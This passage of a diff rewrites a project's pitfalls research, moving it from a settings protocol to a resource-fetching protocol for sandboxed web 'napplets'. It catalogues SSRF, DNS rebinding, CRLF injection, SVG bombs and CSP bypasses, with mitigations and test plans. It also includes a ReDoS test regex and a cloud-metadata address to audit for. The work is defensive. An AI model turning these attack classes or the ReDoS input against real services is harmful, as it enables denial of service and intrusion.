-| ReDoS via `pattern` on keystroke validate | Main thread hangs 5s+ on certain inputs | Worker-based validator with 50ms timeout, OR linear-time regex engine | Any napplet declaring a regex; exploitable by malicious napplet OR by careless regex author |
-| Unbounded schema depth rendering | Render time balloons exponentially for deeply nested objects | Depth limit enforced at registerSchema | Schema with 10+ nesting levels |
-| Per-keystroke `config.values` broadcast to all subscribers | postMessage flooding, napplets lag | Coalesce emits per Pitfall 11 | Any slider-style or high-frequency setting |
-| No debounce between rapid `config.openSettings` calls | Settings UI flickers, user cannot use anything | Rate-limit per Pitfall 17 | Malicious or buggy napplet |
-| Large default values (megabyte strings) re-sent on every subscribe update | Message channel saturation | Limit default value size in wire contract (recommend 64KB per property); shells MAY enforce quota per `(dTag, aggregateHash)` | Any napplet with base64-embedded assets in defaults |
+| Cache stampede on viral avatar | 100s of duplicate upstream requests | Single-flight Map<canonicalURL, Promise<Blob>> | Any timeline-style napplet with shared authors |
+| Blob lifetime leak | Memory grows over session, never frees | Napplet revokeObjectURL discipline + shell quota + LRU eviction | Long-session napplets with many resource calls |
+| Structured clone of multi-MB Blobs | UI jank on every resource delivery | Transferable above 256KB; size cap at 10MB | Anything larger than thumbnails; will become acute when audio/video lands |
+| Sidecar pre-fetch flood | Shell makes hundreds of upstream requests on relay event arrival | Default sidecar OFF; opt-in per shell + per kind allowlist | Any active relay subscription |
+| SVG rasterizer DoS (billion laughs) | Worker pegs CPU, OOMs page | Input size cap (5MB) + rasterizer time budget (2s) + entity expansion guard | Any user-supplied SVG; profile pictures from arbitrary npubs |
+| Redirect chain abuse | Shell follows long redirect chains, fetch budget exhausted | Cap redirects at 5; per-hop policy re-validation | Adversarial upstreams |
+| `fetch` library default DNS resolver | Hits internal DNS, can be rebound | Explicit external resolver + DNS pinning to first resolved IP | Any cloud-deployed shell with internal DNS access |
 
 ---
 
@@ -638,83 +681,68 @@ Conversely: if storage is keyed on `dTag` alone (not hash), an older napplet ver
 
 | Mistake | Risk | Prevention |
 |---|---|---|
-| External `$ref` resolution at registerSchema | Exfiltration of machine identity, DoS, cache poisoning | Forbid non-local `$ref` in wire contract (Pitfall 3) |
-| Trusting napplet-supplied `dTag` / `aggregateHash` in messages | Cross-napplet scope escape | Derive scope from MessageEvent.source only (Pitfall 6) |
-| Secret field with a declared default | Shared-credential leak to every user | Forbid (Pitfall 8) |
-| Persist unknown properties "just in case" | Stale secrets remain after napplet drops them | Drop immediately for secret fields; grace period for non-secret (Pitfall 15) |
-| Validate `pattern` on UI thread with default RegExp | ReDoS hangs the entire shell | Worker + timeout or linear-time engine (Pitfall 4) |
-| Napplet can openSettings to steal focus | Focus ping-pong, keystroke hijack | Shell MAY ignore; rate limit (Pitfall 17) |
-| Napplet writes its own config | Bypasses user consent, schema validation, shell UX | No napplet→shell write message exists (Pitfall 7) |
-| postMessage secret values cleartext | Any extension with script access reads | Document as known limitation; don't pretend it's solved (Pitfall 9) |
+| Allow `connect-src` to anything in production CSP | Defeats browser-enforced isolation | Hard-coded `connect-src 'none'` in default; vite-plugin assertion (Pitfall 9) |
+| `allow-same-origin` on iframe sandbox | Service worker bypass + same-origin escape | Defensive throw in shim; spec MUST in NIP-5D (Pitfall 5) |
+| Default `fetch` for `resource.bytes` upstream | SSRF to cloud metadata, internal services, loopback | DNS-pin + IP block + scheme allowlist + redirect re-validation (Pitfall 6) |
+| Trust napplet-supplied `nostr:` parsing | Malformed bech32 → parser crash; injection via path | Use canonical NIP-19 parser with strict validation (Pitfall 27) |
+| Pass-through upstream `Content-Type` | MIME confusion → wrong renderer path | Byte-sniff + classify (Pitfall 24) |
+| Pass-through upstream Set-Cookie / Authorization | Shell leaks credentials to napplet or vice versa | Strip all upstream headers except classified MIME + content length (Pitfall 16) |
+| Allow CRLF in URL components | Header injection / request smuggling | WHATWG URL parser; reject control chars in URL components (Pitfall 16) |
+| Render SVG via `<img src=blob:svg>` without sanitization | `<foreignObject>` XHTML injection (browser-dependent) | Rasterize to bitmap or strip `<foreignObject>` (Pitfall 7) |
+| Use SHA-1 / MD5 / truncated hash for content addressing | Theoretical collision, audit failure | SHA-256 minimum (Pitfall 14) |
+| Expose cache hit/miss to napplet | Side-channel: napplet can probe what other users / napplets viewed | Cache is shell-internal; napplet sees only Blob or error (Pitfall 14) |
+| Sidecar on by default | Privacy leak: shell pre-fetches reveal user activity | Opt-in per shell + per event kind (Pitfall 10) |
+| Allow `worker-src` by default | Workers from blob URLs inherit creator CSP; subtle bypass | `worker-src 'none'` default; opt-in via manifest (Pitfall 4) |
+| Allow `eval`, `unsafe-eval`, `unsafe-inline` for scripts | CSP becomes decorative | Nonce-based `script-src`; never `'unsafe-eval'` (Pitfall 19) |
+| Header-only directives in meta CSP | Silently ignored — false sense of security | Build-time validator rejects header-only in meta (Pitfall 2) |
 
 ---
 
-## UX Pitfalls (flagged as shell-concern but worth calling out for DOCS)
+## UX Pitfalls (flagged as IMPL/DOCS concern; MUST NOT inflate spec)
 
-| Pitfall | User Impact | Shell-Side Mitigation (non-normative in spec) |
+| Pitfall | User Impact | Shell-Side Mitigation (non-normative) |
 |---|---|---|
-| Settings open while typing a URL / editing another field | Lost focus, data loss | Shells SHOULD animate settings into a side drawer, not a modal |
-| First-launch empty-settings state | User doesn't know where to begin | Shells SHOULD show declared descriptions prominently |
-| Rebind UI pre-rendered before values arrive | Flash of default content then "correct" values swap in | SDK's subscribe wrapper exposes a `loading` state until first delivery |
-| Secret field copy-paste | User copies value, pastes into shared doc | Shells SHOULD mask in UI AND block clipboard copy for `x-napplet-secret: true` fields |
+| Image flickers as sidecar arrives mid-render | Layout jank | Reserve image space; prefer sidecar; show low-res placeholder |
+| First-render delay because resource not yet fetched | Empty avatars on cold load | Persistent shell-side cache survives reload |
+| User edits profile avatar; old version cached | Stale UX | Honor `Cache-Control` headers; provide shell "clear cache" |
+| Napplet rate-limited mid-session | Suddenly broken images | Surface rate-limit state to napplet via error envelope; SDK shows retry-after info |
+| SVG rasterization slow on first use | Settings page hangs briefly | Pre-warm common rasterizations; surface progress |
+| Shell-policy denies a URL napplet author thinks is fine | Confused dev experience | Clear `denied` reason in error envelope; vite-plugin lints common offenders at build |
 
-These are documented to guide shell authors but MUST NOT appear as MUST-level requirements in NUB-CONFIG.
+These are documented to guide shell authors but MUST NOT appear as MUST-level requirements in NUB-RESOURCE.
 
 ---
 
 ## "Looks Done But Isn't" Checklist
 
-- [ ] **Wire messages:** `config.registerSchema.result` / `config.get.result` / etc. defined for EVERY napplet→shell request — verify error envelopes specified
-- [ ] **JSON Schema subset:** Core Subset vs Extended Subset enumerated explicitly — verify forbidden features listed
-- [ ] **`$ref` rules:** Wire contract forbids external/filesystem/cross-doc refs — verify with a test schema
-- [ ] **Secret handling:** `x-napplet-secret: true` + `default` combination forbidden — verify at build time (vite-plugin) AND runtime (shell)
-- [ ] **additionalProperties default:** NUB-CONFIG overrides JSON Schema default to `false` at top level — verify documented
-- [ ] **Source identity:** Security considerations section references NIP-5D MessageEvent.source binding — verify parent spec cited
-- [ ] **No napplet→shell write:** No `config.set` or `config.update` message exists in the type catalog — verify wire message list
-- [ ] **Error codes:** Enumerated set of error codes, not ad-hoc strings — verify catalog exists
-- [ ] **Public repo hygiene:** Spec `## Implementations` section is `(none yet)` and no `@napplet/*` mentions anywhere in spec, commits, or PR bodies — verify before submitting PR
-- [ ] **Migration guidance:** Schema evolution non-normative notes present — verify it discusses rename, type change, constraint tightening, property removal
-- [ ] **Ordering deterministic:** `x-napplet-order` rule plus tie-break rule stated — verify two-property collision test case documented
-- [ ] **Depth limit:** Max nesting depth stated as a number — verify
-- [ ] **Pattern protection:** ReDoS mitigation requirement stated — verify shell guidance exists
-- [ ] **Format annotative:** `format` declared as hint-only — verify
-- [ ] **Orphan values:** Retention rule defined — verify secrets drop immediate, non-secrets grace period
-- [ ] **openSettings:** Non-binding semantics stated — verify shells MAY ignore
-- [ ] **Vite-plugin enforcement:** Plugin runs schema through meta-schema + subset checker at build — verify in PACKAGE phase checklist
-- [ ] **Subscribe ordering:** First `config.values` delivery happens AFTER registerSchema settles — verify explicit in spec
-
----
-
-## Pitfall-to-Phase Mapping
-
-| Pitfall | Severity | Prevention Phase | Verification |
-|---|---|---|---|
-| P1 — Feature subset scope creep | HIGH | SPEC | Read the subset definition section; look for enumerated Core/Extended lists |
-| P2 — Unbounded nesting / recursive $ref | HIGH | SPEC + PACKAGE | Test schema with depth=5 (should reject if limit=4); test `$ref: "#"` (should reject) |
-| P3 — External $ref resolution | HIGH | SPEC + PACKAGE | Test schema with `$ref: "https://..."` (should reject at build AND runtime) |
-| P4 — pattern ReDoS | HIGH | SPEC + INTEGRATION | Test with `^(a|a)*$` and 31-char input against reference shim — must not hang main thread |
-| P5 — additionalProperties default true | HIGH | SPEC | Read default resolution rule; test schema with no additionalProperties — verify shell treats top-level as `false` |
-| P6 — Source identity scope spoof | HIGH | SPEC | Verify security considerations cites NIP-5D source binding |
-| P7 — Napplet config write | HIGH | SPEC + PACKAGE | Inspect wire message catalog — no `config.set` anywhere |
-| P8 — Secret + default | HIGH | SPEC + PACKAGE | Test schema with both (should reject at build AND runtime) |
-| P9 — Cleartext secret over postMessage | HIGH | SPEC + DOCS | Read security considerations — must acknowledge as inherent |
-| P10 — registerSchema/subscribe race | MEDIUM | SPEC + PACKAGE | SDK wrapper chains register→subscribe internally |
-| P11 — Delivery debounce undefined | MEDIUM | SPEC + DOCS | Read subscribe semantics — value snapshot always current-complete |
-| P12 — Orphaned subscriptions | MEDIUM | INTEGRATION | Reference shim shows source-death cleanup |
-| P13 — Default precedence ambiguity | MEDIUM | SPEC | Read resolution rule section — property-level wins over object-level |
-| P14 — Schema evolution orphans values | MEDIUM | SPEC + DOCS | Non-normative section enumerates rename/retype/tighten/remove cases |
-| P15 — Orphaned persisted values | HIGH | SPEC | Retention rule stated; secrets drop immediate |
-| P16 — aggregateHash scope churn | MEDIUM | SPEC + DOCS | Scope rule stated; cross-hash migration noted as shell concern |
-| P17 — openSettings spam | MEDIUM | SPEC + INTEGRATION | Non-binding semantics stated; reference shim rate-limits |
-| P18 — openSettings unknown section | MEDIUM | SPEC | Matching rule against `x-napplet-section`; behavior for unknown stated |
-| P19 — format inconsistency | HIGH | SPEC | `format` annotative only; enumerated known hints |
-| P20 — Duplicate registerSchema | LOW | SPEC | Replace-not-merge semantics stated |
-| P21 — x-napplet-order collision | LOW | SPEC | Tie-break rule stated |
-| P22 — Runtime-computed defaults | LOW | SPEC | Explicit note that defaults are literal |
-| P23 — i18n unaddressed | LOW | SPEC | Explicit out-of-scope acknowledgement |
-| P24 — Vite-plugin ships invalid schemas | LOW | PACKAGE | Plugin runs meta-schema + subset check at build |
-| P25 — @napplet references in public spec | HIGH | SPEC + DOCS | Grep public spec for `@napplet/` — must return zero |
-| P26 — Undefined error envelopes | HIGH | SPEC | Error code catalog present; every request has a result type |
+- [ ] **Meta CSP placement:** First child of `<head>`? Verify with HTML walker assertion in vite-plugin and a Playwright DOM-walk test (Pitfall 1)
+- [ ] **Header-only directives:** Vite-plugin rejects `frame-ancestors`, `report-uri`, etc. in meta CSP at build time? (Pitfall 2)
+- [ ] **srcdoc avoidance:** Reference shim uses blob URL or separate origin for napplet HTML? Spec note in NIP-5D? (Pitfall 3)
+- [ ] **`worker-src 'none'` default:** Vite-plugin emits this; opt-in for napplets that need workers? (Pitfall 4)
+- [ ] **Sandbox `allow-scripts` only:** Reference shim defensively throws on `allow-same-origin`? (Pitfall 5)
+- [ ] **SSRF defaults:** Private IP block + DNS pinning + scheme allowlist + redirect cap implemented in reference shim, documented in NUB-RESOURCE Security Considerations? (Pitfall 6)
+- [ ] **SVG handling:** Rasterizer in sandboxed Worker; entity-expansion / `<foreignObject>` / recursive `<use>` all rejected; size + time caps? (Pitfall 7)
+- [ ] **Cross-repo sync:** NUB-RESOURCE PR + NUB-RELAY/IDENTITY/MEDIA amendments + NIP-5D §Security all landed in lock-step; CI drift check? (Pitfall 8)
+- [ ] **No backcompat:** No `@deprecated` annotations; no fallback `fetch` path; no CSP opt-out? (Pitfall 9)
+- [ ] **Sidecar default off:** Reference shim defaults to no sidecar pre-fetch; explicit opt-in flag? (Pitfall 10)
+- [ ] **Blob lifetime:** SDK helper provides cleanup pattern; shell quota documented? (Pitfall 11)
+- [ ] **Transferable thresholds:** Size-based delivery choice; 10MB hard cap; perf test? (Pitfall 12)
+- [ ] **Single-flight cache:** 100-concurrent-same-URL test confirms 1 upstream request? (Pitfall 13)
+- [ ] **Hash internals:** Hash values never appear in wire envelopes; SHA-256 minimum; documented? (Pitfall 14)
+- [ ] **Sidecar in same envelope:** No follow-up `resource.preresolved` message; sidecar always in original `relay.event`? (Pitfall 15)
+- [ ] **URL validation:** WHATWG parser; CRLF/NUL rejection; per-hop redirect re-validation? (Pitfalls 16, 17)
+- [ ] **Two-mode CSP:** Vite-plugin emits dev CSP (HMR-permissive) and prod CSP (strict); build-time assertion that prod doesn't inherit dev laxity? (Pitfall 18)
+- [ ] **Nonce-based scripts:** No `'unsafe-eval'` ever; no `'unsafe-inline'` for scripts; nonce wired through Vite? (Pitfall 19)
+- [ ] **fetch lint:** Lint rule detects `fetch(`, `XMLHttpRequest`, `WebSocket`, `EventSource` in napplet source? (Pitfall 20)
+- [ ] **CSP violation tests:** Tests assert positive blocking via console + requestfailed correlation, not just "image isn't visible"? (Pitfall 21)
+- [ ] **Default CSP completeness:** All directives covered in baseline (img-src, font-src, style-src, etc.)? (Pitfall 23)
+- [ ] **MIME byte-sniffing:** Sniffer rejects HTML/JS bytes; allowlist of acceptable MIME types? (Pitfall 24)
+- [ ] **Headed-mode CSP test run:** At least one CI job runs CSP tests headed for verification? (Pitfall 25)
+- [ ] **data: handler:** RFC 2397 conformant; bounded by size cap? (Pitfall 26)
+- [ ] **Scheme handler contracts:** `nostr:`, `blossom:`, `https:`, `data:` handler URL forms locked in spec; capability strings defined? (Pitfall 27)
+- [ ] **`Implementations: (none yet)`:** Public NUB-RESOURCE spec body has zero `@napplet/*` references; PR body has zero PRIVATE-repo links? (Pitfall 8 + memory compliance)
+- [ ] **No `frame-ancestors` in meta:** Build-time assertion or grep over emitted CSP? (Pitfall 2)
+- [ ] **Headless ≠ headed verification:** CSP tests pass in BOTH modes? (Pitfall 25)
 
 ---
 
@@ -722,44 +750,130 @@ These are documented to guide shell authors but MUST NOT appear as MUST-level re
 
 | Pitfall | Recovery Cost | Recovery Steps |
 |---|---|---|
-| Spec shipped without subset definition | HIGH | Amend spec, tag as v1.1 in nubs repo, coordinate with any shell implementors, add subset-check to vite-plugin |
-| External $ref allowed in v1 | HIGH | Emergency spec amendment; shell implementors must ship a fix; audit deployed napplets for external refs |
-| Secret + default coexistence shipped | HIGH | Shell implementations add runtime rejection; napplet authors must rev their schemas |
-| Napplet→shell write message shipped | HIGH | Protocol-level breaking change; bump NUB-CONFIG version; all shells must drop the message type |
-| @napplet/* leaked into public spec or commit history | MEDIUM | Cannot remove from git history cleanly; amend future commits + PR bodies; note in PR that prior references are errata |
-| Orphaned values retained after property removal | MEDIUM | Shell ships a migration that drops orphans; secrets forcibly purged |
-| pattern ReDoS in production | HIGH | Emergency patch to shell's validator; disable pattern validation while fix ships; notify napplet authors |
-| Subscribe race causing empty deliveries | MEDIUM | SDK wrapper adds internal serialization; no spec change needed |
+| Meta CSP placed wrong, shipped napplets unenforced | HIGH | Rebuild napplets via vite-plugin update; bump aggregateHash; warn shell users; run audit on existing napplets |
+| `frame-ancestors` in meta, didn't apply | MEDIUM | Switch to header-based delivery for that directive; if not possible, remove directive and document the gap |
+| srcdoc CSP inheritance broke isolation | HIGH | Switch to blob URL delivery; rebuild all napplets; bump milestone version |
+| `allow-same-origin` slipped into iframe sandbox | HIGH | Remove immediately; security advisory; audit deployed shells |
+| SSRF via missing IP filter | HIGH | Emergency shell update; revoke any cloud creds that may have leaked; audit logs for `169.254.169.254` access |
+| SVG bomb shipped without rasterization | HIGH | Disable SVG MIME in scheme dispatcher until rasterizer ships; emergency vite-plugin lint |
+| Cross-repo drift discovered late | MEDIUM | Amend public spec PR; re-run drift CI; coordinate merge order |
+| Backcompat fallback shipped | HIGH | Hard remove; document protocol break; ship vite-plugin update that fails build on legacy patterns |
+| Sidecar default-on revealed user activity to upstream hosts | MEDIUM | Default-off in next release; ship migration warning; consider it a privacy incident if data was correlatable |
+| Blob lifetime leak in long sessions | MEDIUM | Ship shell quota enforcement; SDK helpers for revoke discipline; profile + fix worst napplets |
+| Cache stampede observed in production | LOW | Ship single-flight in shell; no protocol change required |
+| Hash collision (theoretical, but if MD5/SHA-1 ever shipped) | HIGH | Re-cache with SHA-256; invalidate all entries; bump format version |
+| `unsafe-eval` shipped in default CSP | HIGH | Remove from default; switch tooling if needed; rebuild affected napplets |
+| Playwright tests passed without verifying CSP blocking | MEDIUM | Rewrite tests with positive blocking assertions; re-run; address any new failures (these are real bugs) |
+| `@napplet/*` mention shipped in public spec | MEDIUM | Cannot remove from git history cleanly; amend future commits; note as errata in PR; ensure CI grep prevents recurrence |
+
+---
+
+## Pitfall-to-Phase Mapping
+
+| Pitfall | Severity | Phase | Verification |
+|---|---|---|---|
+| P1 — Meta CSP placement | PROJECT-KILLER | IMPL (vite-plugin) + VERIFY | Playwright DOM-walk asserts meta is first `<head>` child + zero CSP violations on hello-world napplet |
+| P2 — Header-only directives in meta | PROJECT-KILLER | SPEC + IMPL | Vite-plugin rejects offending directives at build; integration test |
+| P3 — srcdoc CSP inheritance | PROJECT-KILLER | SPEC (NIP-5D §Security note) + IMPL (shim uses blob URL) | Shim integration test; spec text reviewed |
+| P4 — Worker blob CSP inheritance + minimum CSP allowances | PROJECT-KILLER | SPEC (NUB-RESOURCE blob delivery + minimum CSP) + IMPL (vite-plugin defaults) + VERIFY | Worker-creation-blocked test |
+| P5 — `allow-same-origin` + service worker bypass | PROJECT-KILLER | SPEC (NIP-5D MUST NOT) + IMPL (defensive throw) + VERIFY | SW non-interception test |
+| P6 — SSRF / cloud metadata / DNS rebind | PROJECT-KILLER | SPEC (NUB-RESOURCE Security MUST list) + IMPL (defaults) + VERIFY | Test each blocked range; DNS-pin test |
+| P7 — SVG `<foreignObject>` + bombs | PROJECT-KILLER | SPEC (rasterize/sanitize MUST) + IMPL (sandboxed rasterizer) + VERIFY | Billion-laughs test, foreignObject test, recursive `<use>` test |
+| P8 — Cross-repo spec drift | PROJECT-KILLER | SPEC (cross-repo coordination) + IMPL (CI drift check) | CI grep + lock-step PR merge gate |
+| P9 — Backcompat patterns sneaking in | PROJECT-KILLER | SPEC + IMPL + DOCS | Code review checklist; vite-plugin no-CSP-relaxation guard; REQUIREMENTS.md no-backcompat section |
+| P10 — Sidecar privacy leak | PROJECT-KILLER (if default-on) / SERIOUS (if opt-in) | SPEC (NUB-RELAY opt-in MUST) + IMPL (default off) | Default behavior test; opt-in flag test |
+| P11 — Blob lifetime | SERIOUS | SPEC (lifetime contract) + IMPL (SDK helper + shell quota) | Long-session memory test |
+| P12 — postMessage clone perf | SERIOUS | SPEC (size cap + transport guidance) + IMPL (size-based transport) + VERIFY | Perf test for 5MB delivery <50ms |
+| P13 — Cache stampede | SERIOUS | SPEC (single-flight contract) + IMPL (Map dedup) + VERIFY | 100-concurrent-same-URL test |
+| P14 — Cache invalidation + hash internals | SERIOUS | SPEC (cache semantics + algorithm requirements) + IMPL (HTTP cache + SHA-256) | HTTP cache header test; hash exposure grep |
+| P15 — Sidecar race | SERIOUS | SPEC (single-envelope MUST) + IMPL (SDK wrapper) | Race-condition test |
+| P16 — CRLF / header injection | SERIOUS | SPEC (URL validation MUST) + IMPL (WHATWG URL) | Control-char-in-URL test |
+| P17 — Open redirect | SERIOUS | SPEC (per-hop revalidation MUST) + IMPL (custom fetch) + VERIFY | Redirect-to-private-IP and redirect-loop tests |
+| P18 — Vite HMR vs CSP | SERIOUS | IMPL (two-mode CSP) + DOCS | Build asserts dev CSP doesn't leak to prod |
+| P19 — Vite inline scripts need nonces | SERIOUS | IMPL (vite-plugin nonce setup) + VERIFY | Zero-CSP-violation test on built napplet |
+| P20 — Source maps + dynamic import + lint | SERIOUS | IMPL (vite-plugin defaults + lint) + DOCS | Lint detects fetch usage |
+| P21 — Playwright auto-wait masks CSP block | SERIOUS | VERIFY (test patterns) | Helper enforced via lint or pattern review |
+| P22 — SharedArrayBuffer / COOP-COEP | ANNOYANCE (until A/V lands) | SPEC (out-of-scope note) + IMPL (lint warning) | Lint warning test |
+| P23 — Default CSP misses directives | ANNOYANCE | IMPL (complete baseline) + DOCS | Hello-world image-rendering test |
+| P24 — MIME sniffing disagreement | ANNOYANCE → SERIOUS | SPEC (sniffing rules) + IMPL (battle-tested sniffer) | HTML-bytes-as-PNG test |
+| P25 — Headless ≠ headed | ANNOYANCE | VERIFY (tagged tests, headed CI run) | Both-mode CI green |
+| P26 — Data URL quirks | ANNOYANCE | SPEC (data: handler contract) + IMPL (RFC 2397 parser) | Edge-case data URL tests |
+| P27 — Scheme conventions | ANNOYANCE → SERIOUS | SPEC (per-scheme contracts + capability strings) + IMPL (handlers) + VERIFY | Per-scheme dispatch test |
 
 ---
 
 ## Sources
 
-### JSON Schema Specification and Risks
-- [JSON Schema draft-07 object keyword reference](https://json-schema.org/understanding-json-schema/reference/object) — additionalProperties defaults to true; confirms Pitfall 5
-- [JSON Schema modular combination — $ref security warning](https://json-schema.org/understanding-json-schema/structuring) — official guidance to bundle refs rather than resolve at runtime; supports Pitfall 3
-- [Learn JSON Schema — $ref (Draft 7)](https://www.learnjsonschema.com/draft7/core/ref/) — documents draft-07 sibling-keyword-ignored behavior
-- [Python jsonschema referencing docs](https://python-jsonschema.readthedocs.io/en/latest/referencing/) — documents ref resolution security concerns with untrusted schemas
-- [Understanding JSON Schema — Conditional validation](https://json-schema.org/understanding-json-schema/reference/conditionals) — context for Extended Subset conditionals
+### CSP Delivery and Inheritance
+- [W3C Content Security Policy Level 3](https://www.w3.org/TR/CSP3/) — header-only directive list (`frame-ancestors`, `sandbox`, `report-uri`, `report-to`)
+- [MDN: Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy) — meta vs header behavior; worker blob CSP inheritance
+- [csplite test240 — meta CSP placement requirements](https://csplite.com/csp/test240/) — confirms meta CSP only applies to elements parsed after it
+- [Simon Willison — Can JavaScript Escape a CSP Meta Tag Inside an Iframe? (April 2026)](https://simonwillison.net/2026/Apr/3/test-csp-iframe-escape/) — recent confirmation that sandboxed-iframe CSP cannot be removed by inline JS
+- [W3C webappsec-csp issue #700 — srcdoc inherits parent CSP, wontfix](https://github.com/w3c/webappsec-csp/issues/700) — confirms srcdoc-iframe CSP inheritance limitation
+- [Mozilla bug 1073952 / CVE-2017-7788 — srcdoc + sandbox CSP bypass](https://bugzilla.mozilla.org/show_bug.cgi?id=1073952) — historical precedent for srcdoc bypass
+- [Chromium issue 486308 — Service Worker bypasses iframe sandbox](https://bugs.chromium.org/p/chromium/issues/detail?id=486308) — service worker can intercept sandboxed-iframe with `allow-same-origin`
+- [w3c/ServiceWorker issue 1390 — sandbox + SW compatibility](https://github.com/w3c/ServiceWorker/issues/1390) — confirms incompatibility unless `allow-same-origin`
 
-### ReDoS (Regular Expression Denial of Service)
-- [CVE-2025-69873 — ajv ReDoS via pattern keyword](https://security.snyk.io/vuln/SNYK-JS-AJV-15274295) — concrete proof 31-char payload → 44s CPU blocking; supports Pitfall 4
-- [GHSA-2g4f-4pwh-qvx6 — ajv ReDoS advisory](https://osv.dev/vulnerability/GHSA-2g4f-4pwh-qvx6) — independent confirmation
-- [Ajv security considerations](https://ajv.js.org/security.html) — recommends linear-time regex engine; guidance cited in Pitfall 4 mitigation
-- [Learn JSON Schema — pattern (2020-12)](https://www.learnjsonschema.com/2020-12/validation/pattern/) — documents ECMA-262 regex semantics
+### Blob and Resource Lifecycle
+- [MDN: URL.createObjectURL](https://developer.mozilla.org/en-US/docs/Web/API/URL/createObjectURL_static) — lifecycle, revoke discipline, memory leak conditions
+- [MDN: URL.revokeObjectURL](https://developer.mozilla.org/en-US/docs/Web/API/URL/revokeObjectURL_static) — proper cleanup pattern
+- [Bugzilla 939510 — revokeObjectURL doesn't free download blobs](https://bugzilla.mozilla.org/show_bug.cgi?id=939510) — edge case
+- [MDN: Transferable objects](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Transferable_objects) — Transferable list, Blob is structured-cloneable but not Transferable
+- [Surma — Is postMessage slow?](https://surma.dev/things/is-postmessage-slow/) — empirical perf characteristics
 
-### NIP-5D / Napplet Context (internal — private repo, not cited in any public spec)
-- `.planning/PROJECT.md` — milestone scope and existing NUB modular architecture
-- `.planning/STATE.md` — v0.25.0 design decisions (JSON Schema draft-07+, shell-sole-writer, storage scope, $version potentiality)
-- Existing v0.20.0 PITFALLS research (keys NUB) — focus-stealing pattern transfer (Pitfall 17)
+### Cross-Origin Isolation
+- [web.dev — COOP and COEP](https://web.dev/articles/coop-coep) — SharedArrayBuffer requirements
+- [Stackblitz — Cross-Browser support with COOP/COEP](https://blog.stackblitz.com/posts/cross-browser-with-coop-coep/) — sandbox + COEP brittleness
+
+### SSRF and Network
+- [Yunus Aydın — SSRF DNS Rebinding (March 2026)](https://aydinnyunus.github.io/2026/03/14/ssrf-dns-rebinding-vulnerability/) — recent rebinding attack patterns
+- [Behrad Taher — DNS Rebinding Attacks Against SSRF Protections](https://behradtaher.dev/DNS-Rebinding-Attacks-Against-SSRF-Protections/) — DNS-pinning mitigation
+- [Wiz — Server-Side Request Forgery overview](https://www.wiz.io/academy/application-security/server-side-request-forgery) — cloud metadata, IMDSv2 token flow
+- [Stytch — Securing Identity APIs Against SSRF](https://stytch.com/blog/securing-identity-apis-against-ssrf/) — DNS pinning via IP-substitution
+- [Axios CRLF / cloud metadata header injection advisory (GHSA-fvcv-3m26-pcqx)](https://github.com/axios/axios/security/advisories/GHSA-fvcv-3m26-pcqx) — CRLF in URL fetch
+- [Node undici CRLF fix commit](https://github.com/nodejs/undici/commit/e43e898603dd5e0c14a75b08b83257598d664a39) — upgrade-header CRLF validation
+- [HackerOne report 2001873 — Node.js HTTP Request Smuggling](https://hackerone.com/reports/2001873) — Node-level smuggling
+
+### SVG Attack Surface
+- [Fortinet — Anatomy of SVG Attack Surface on the Web](https://www.fortinet.com/blog/threat-research/scalable-vector-graphics-attack-surface-anatomy) — `<foreignObject>`, `<use>` recursion, attack patterns
+- [SVGO billion laughs CVE-2026-29074](https://github.com/advisories/GHSA-xpqw-6gx7-v673) — entity expansion DoS in svgo
+- [Mozilla CVE-2022-28284 — SVG `<foreignObject>` XSS](https://bugzilla.mozilla.org/show_bug.cgi?id=1754522) — historical SVG XSS via foreignObject
+- [PacketWanderer — Stored XSS Through Malicious SVG Uploads](https://packetwanderer.com/posts/svg-xss/) — sanitization guidance
+- [MDN: Canvas using images — drawImage SVG behavior](https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API/Tutorial/Using_images) — SVG rendering boundary; canvas tainting
+
+### Vite + CSP
+- [vite issue #11862 — strict CSP in dev](https://github.com/vitejs/vite/issues/11862) — HMR connect-src conflict
+- [vite issue #15404 — script-src unsafe-inline requirement](https://github.com/vitejs/vite/issues/15404) — inline script issue
+- [vite issue #9719 — nonce in __vitePreload](https://github.com/vitejs/vite/issues/9719) — nonce wiring
+- [vite issue #16749 — strict CSP in production](https://github.com/vitejs/vite/issues/16749) — prod-mode tighter policies
+- [vite-csp guard SPA guide](https://vite-csp.tsotne.co.uk/guides/spa) — community CSP integration patterns
+
+### ReDoS and Validation (referenced from prior research; relevant for resource policy regex matchers)
+- [CVE-2025-69873 — ajv ReDoS via pattern keyword](https://security.snyk.io/vuln/SNYK-JS-AJV-15274295) — risk if shell uses regex on URL allowlists
+- [Ajv security considerations](https://ajv.js.org/security.html) — linear-time engine recommendation
+
+### Cache Coalescing
+- [Cache stampede prevention with single-flight](https://1xapi.com/blog/nodejs-cache-stampede-single-flight-pattern-2026) — Promise-Map dedup pattern
+- [Wikipedia: Cache stampede](https://en.wikipedia.org/wiki/Cache_stampede) — definition + standard mitigations
+- [GroupCache singleflight](https://deepwiki.com/golang/groupcache/4.1-thundering-herd-protection) — reference implementation
+
+### Playwright + CSP
+- [Playwright Network](https://playwright.dev/docs/network) — request/requestfailed events
+- [Playwright ConsoleMessage](https://playwright.dev/docs/api/class-consolemessage) — console capture for CSP violations
+- [LambdaTest — Playwright AssertCSPError example](https://www.lambdatest.com/automation-testing-advisor/csharp/methods/Microsoft.Playwright.Tests.TestUtils.AssertCSPError) — pattern reference
+
+### Internal NIP-5D / Napplet Context (PRIVATE — NOT cited in any public NUB spec)
+- `.planning/PROJECT.md` — v0.28.0 milestone scope; explicit no-backcompat stance; sidecar/SVG/policy goals
+- `specs/NIP-5D.md` v3 — current §Transport (`allow-scripts` only), §Identity (MessageEvent.source binding), §Security Considerations
+- `.planning/research/PITFALLS.md` (prior, NUB-CONFIG) — patterns reused for: scope classification, public-repo discipline, error envelope catalog, openSettings/focus-stealing analogue (sidecar-as-request)
 
 ### Internal Memory (constraint set)
-- `feedback_nub_scope_boundary` — NUBs define protocol, not shell implementation (drives every scope classification above)
-- `feedback_no_implementations` — no `@napplet/*` in NUB specs (drives Pitfall 25)
-- `feedback_no_private_refs_commits` — public nubs repo must not reference private napplet repo (drives Pitfall 25)
-- `feedback_nub_modular` — NUB packages own ALL logic (informs PACKAGE phase expectations)
+- `feedback_nub_scope_boundary` — drives every SPEC-vs-IMPL-vs-DOCS classification above
+- `feedback_no_implementations` — drives Pitfall 8 + Implementations: (none yet) requirement
+- `feedback_no_private_refs_commits` — drives Pitfall 8 commit/PR discipline
